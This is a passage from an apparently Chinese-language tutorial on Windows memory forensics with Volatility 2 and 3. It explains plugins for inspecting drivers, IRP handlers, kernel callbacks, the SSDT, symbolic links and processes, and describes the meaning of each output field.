&lt;p&gt;这是在注册表中为该服务配置的&lt;code&gt;ImagePath&lt;/code&gt;值&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Dll：服务DLL&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果该服务是由一个DLL实现并由&lt;code&gt;svchost.exe&lt;/code&gt;托管的，这里会显示该 DLL 的路径&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看驱动模块modulesdriverscanmodscan&#34;&gt;查看驱动模块（modules/driverscan/modscan）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-3&#34;&gt;Volatility2
&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;使用&lt;code&gt;modules&lt;/code&gt;来查看驱动模块，通过遍历内核中的&lt;code&gt;PsLoadedModuleList&lt;/code&gt;官方链表来获取信息：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; modules
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718095930867&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718095930867.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718095930867.png&#34; alt=&#34;image-20250718095930867&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Offset(V)&lt;/code&gt;&lt;/strong&gt;：该模块的&lt;code&gt;_LDR_DATA_TABLE_ENTRY&lt;/code&gt;结构在内存中的虚拟地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Name&lt;/code&gt;&lt;/strong&gt;：模块的名称，例如 &lt;code&gt;ntoskrnl.exe&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Base&lt;/code&gt;&lt;/strong&gt;：模块被加载到内存中的基地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Size&lt;/code&gt;&lt;/strong&gt;：模块在内存中所占空间的大小&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;File&lt;/code&gt;&lt;/strong&gt;：该模块对应的磁盘文件路径&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;或者也可以使用&lt;code&gt;driverscan&lt;/code&gt;通过扫描内存池来寻找驱动对象，这种方式能发现一部分隐藏的驱动对象：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; driverscan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718100005508&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718100005508.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718100005508.png&#34; alt=&#34;image-20250718100005508&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Offset(P)&lt;/code&gt;&lt;/strong&gt;：该驱动对象在内存中的物理地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;#Ptr&lt;/code&gt;&lt;/strong&gt;：指向该驱动对象的指针数量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;#Hnd&lt;/code&gt;&lt;/strong&gt;：该驱动对象的句柄数量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Start&lt;/code&gt;&lt;/strong&gt;：驱动程序在内存中的起始地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Size&lt;/code&gt;&lt;/strong&gt;：驱动程序在内存中所占空间的大小&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Service Key&lt;/code&gt;&lt;/strong&gt;：该驱动在注册表服务项中的名称，这通常与驱动名相同&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Name&lt;/code&gt;&lt;/strong&gt;：驱动的名称&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Driver Name&lt;/code&gt;&lt;/strong&gt;：驱动对象在系统中的完整名称，通常以&lt;code&gt;\Driver\&lt;/code&gt;或&lt;code&gt;\FileSystem\&lt;/code&gt;开头&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;还可以使用modscan扫描模块结构特征寻找驱动，最全面，能发现大多数隐藏模块速度慢，但可能有误报：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; modscan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718120519596&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718120519596.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718120519596.png&#34; alt=&#34;image-20250718120519596&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;物理地址不同是正常的，因为它们扫描和定位的目标数据结构不同&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;volatility3-3&#34;&gt;Volatility3
&lt;/h4&gt;&lt;p&gt;使用&lt;code&gt;modules&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.modules.Modules
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718100737803&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718100737803.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718100737803.png&#34; alt=&#34;image-20250718100737803&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;driverscan&lt;/code&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.driverscan.DriverScan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718100933982&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718100933982.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718100933982.png&#34; alt=&#34;image-20250718100933982&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;modscan&lt;/code&gt;：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.modscan.ModScan
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718120611323.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718120611323.png&#34; alt=&#34;&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h3 id=&#34;查看驱动程序的irpdriverirp&#34;&gt;查看驱动程序的IRP（driverirp）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-4&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; driverirp 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718133232360&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718133232360.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718133232360.png&#34; alt=&#34;image-20250718133232360&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;DriverName&lt;/strong&gt;：目标驱动的名称&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;第一列&lt;/strong&gt;：IRP功能码的编号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;第二列&lt;/strong&gt;：IRP功能码的名称，描述了I/O请求的类型，例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_CREATE&lt;/code&gt;：当有程序尝试创建或打开文件时，会产生这个请求&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_READ&lt;/code&gt;：读取文件请求&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_WRITE&lt;/code&gt;：写入文件请求&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_DEVICE_CONTROL&lt;/code&gt;：设备控制请求&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;第三列&lt;/strong&gt;：处理该IRP请求的函数在内存中的实际地址&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;第四列&lt;/strong&gt;：该函数地址所属的内核模块&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;volatility3-4&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.driverirp.DriverIrp
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718133053635&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718133053635.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718133053635.png&#34; alt=&#34;image-20250718133053635&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Offset&lt;/strong&gt;：该驱动对象在内存中的虚拟地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Driver Name&lt;/strong&gt;：驱动对象的名称&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;IRP&lt;/strong&gt;：IRP的主要功能码，代表了驱动程序注册要处理的I/O操作类型，例如：
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_CREATE&lt;/code&gt;：文件或设备创建/打开请求&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_CLOSE&lt;/code&gt;：文件或设备关闭请求&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_READ&lt;/code&gt;：读取请求&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_WRITE&lt;/code&gt;：写入请求&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_DEVICE_CONTROL&lt;/code&gt;：设备控制请求，是驱动程序功能的主要入口&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_INTERNAL_DEVICE_CONTROL&lt;/code&gt;：内部设备控制请求&lt;/li&gt;
&lt;li&gt;&lt;code&gt;IRP_MJ_PNP&lt;/code&gt;：即插即用相关的请求&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Address&lt;/strong&gt;：处理该类型IRP请求的函数在内存中的实际地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Module&lt;/strong&gt;：该函数地址所属的内核模块（驱动文件）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Symbol&lt;/strong&gt;：具体的函数名&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看内核回调callbacks&#34;&gt;查看内核回调（callbacks）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-5&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; callbacks
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718170912078&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718170912078.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718170912078.png&#34; alt=&#34;image-20250718170912078&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h4 id=&#34;volatility3-5&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.callbacks.Callbacks
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718171002430&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718171002430.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718171002430.png&#34; alt=&#34;image-20250718171002430&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Type&lt;/code&gt;：回调类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当这类事件发生时，内核会调用所有注册在此的回调函数，例如：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;PspCreateProcessNotifyRoutine&lt;/code&gt;: 当一个新进程被创建时触发&lt;/li&gt;
&lt;li&gt;&lt;code&gt;PspLoadImageNotifyRoutine&lt;/code&gt;: 当一个可执行文件或DLL被加载到内存时触发&lt;/li&gt;
&lt;li&gt;&lt;code&gt;KeBugCheckCallbackListHead&lt;/code&gt;: 当系统发生蓝屏崩溃时触发&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Callback&lt;/code&gt;：回调函数地址&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Module&lt;/code&gt;：所属模块&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它指明了这个回调函数属于哪个内核模块，即驱动程序&lt;/p&gt;
&lt;p&gt;在正常情况下，这里应该都是&lt;code&gt;ntoskrnl&lt;/code&gt;（内核自身）或已知的、合法的硬件驱动程序（如&lt;code&gt;tcpip&lt;/code&gt;,&lt;code&gt;ndis&lt;/code&gt;等）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Symbol&lt;/code&gt;：回调函数的具体名称&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Detail&lt;/code&gt;：补充说明&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看系统调用ssdt&#34;&gt;查看系统调用（ssdt）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-6&#34;&gt;Volatility2
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; ssdt
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718102449369&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718102449369.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718102449369.png&#34; alt=&#34;image-20250718102449369&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Entry&lt;/code&gt;&lt;/strong&gt;：SSDT 表中的索引号（入口点编号），以十六进制表示&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Address&lt;/code&gt;&lt;/strong&gt;：该索引号对应的内核函数在内存中的实际地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;owned by&lt;/code&gt;&lt;/strong&gt;：指明了这个函数地址属于哪个内核模块&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果一个函数的Owner不是 &lt;code&gt;ntoskrnl.exe&lt;/code&gt;或&lt;code&gt;win32k.sys&lt;/code&gt;，而是另一个可疑的驱动，或者显示为 &lt;code&gt;(unknown)&lt;/code&gt;，就意味着该函数很可能已被挂钩（Hook），指向了恶意的函数&lt;/p&gt;
&lt;h4 id=&#34;volatility3-6&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.ssdt.SSDT
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718103947530&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718103947530.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718103947530.png&#34; alt=&#34;image-20250718103947530&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Index&lt;/code&gt;&lt;/strong&gt;：SSDT 表中的索引号（入口点编号）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Address&lt;/code&gt;&lt;/strong&gt;：该索引号对应的内核函数在内存中的实际地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Module&lt;/code&gt;&lt;/strong&gt;：指明了这个函数地址属于哪个内核模块&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Symbol&lt;/code&gt;&lt;/strong&gt;：该内核函数的具体名称&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查看符号链接symlinkscan&#34;&gt;查看符号链接（symlinkscan）
&lt;/h3&gt;&lt;p&gt;通过扫描内存以寻找并打印出&lt;code&gt;_OBJECT_SYMBOLIC_LINK&lt;/code&gt;结构，列出系统内核中存在的符号链接及其指向的目标&lt;/p&gt;
&lt;h4 id=&#34;volatility2-7&#34;&gt;Volatility2
&lt;/h4&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile=&amp;lt;配置文件&amp;gt; symlinkscan
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718174120289&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718174120289.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718174120289.png&#34; alt=&#34;image-20250718174120289&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;h3 id=&#34;输出字段详解&#34;&gt;输出字段详解
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Offset(P)&lt;/code&gt;&lt;/strong&gt;：该符号链接对象（&lt;code&gt;_OBJECT_SYMBOLIC_LINK&lt;/code&gt; 结构）在内存中的物理地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;#Ptr&lt;/code&gt;&lt;/strong&gt;：指向该符号链接对象的指针数量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;#Hnd&lt;/code&gt;&lt;/strong&gt;：该符号链接对象的句柄数量&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Creation time&lt;/code&gt;&lt;/strong&gt;：该符号链接被创建的时间戳（以UTC标准时间显示）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;From&lt;/code&gt;&lt;/strong&gt;：这是符号链接自身的名称，可以理解为“快捷方式”的名字&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;To&lt;/code&gt;&lt;/strong&gt;：这是该符号链接实际指向的目标对象的名称，可以理解为“快捷方式”指向的“真实文件”的路径&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;volatility3-7&#34;&gt;Volatility3
&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol3 -f &amp;lt;内存镜像&amp;gt; windows.symlinkscan.SymlinkScan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250718175036375&#34; href=&#34;http://picture.928330.xyz/typora/image-20250718175036375.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250718175036375.png&#34; alt=&#34;image-20250718175036375&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Offset&lt;/code&gt;&lt;/strong&gt;：该符号链接对象（&lt;code&gt;_OBJECT_SYMBOLIC_LINK&lt;/code&gt; 结构）在内存中的虚拟地址&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;CreateTime&lt;/code&gt;&lt;/strong&gt;：该符号链接被创建的时间戳（以UTC标准时间显示）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;From Name&lt;/code&gt;&lt;/strong&gt;：这是符号链接自身的名称，可以理解为“快捷方式”的名字&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;To Name&lt;/code&gt;&lt;/strong&gt;：这是该符号链接实际指向的目标对象的名称，可以理解为“快捷方式”指向的“真实文件”的路径&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;进程分析&#34;&gt;进程分析
&lt;/h2&gt;&lt;h3 id=&#34;查看进程列表pslistpsscan&#34;&gt;查看进程列表（pslist/psscan）
&lt;/h3&gt;&lt;h4 id=&#34;volatility2-8&#34;&gt;Volatility2
&lt;/h4&gt;&lt;p&gt;仅查看显式进程：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; pslist 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看包括隐藏进程在内的进程：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;vol2 -f &amp;lt;内存镜像&amp;gt; --profile&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&amp;lt;系统版本&amp;gt; psscan
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;
&lt;div class=&#34;post-img-view&#34;&gt;
&lt;a data-fancybox=&#34;gallery&#34; data-caption=&#34;image-20250713121935145&#34; href=&#34;http://picture.928330.xyz/typora/image-20250713121935145.png&#34;&gt;
&lt;img src=&#34;http://picture.928330.xyz/typora/image-20250713121935145.png&#34; alt=&#34;image-20250713121935145&#34;  /&gt;
&lt;/a&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;ul&gt;
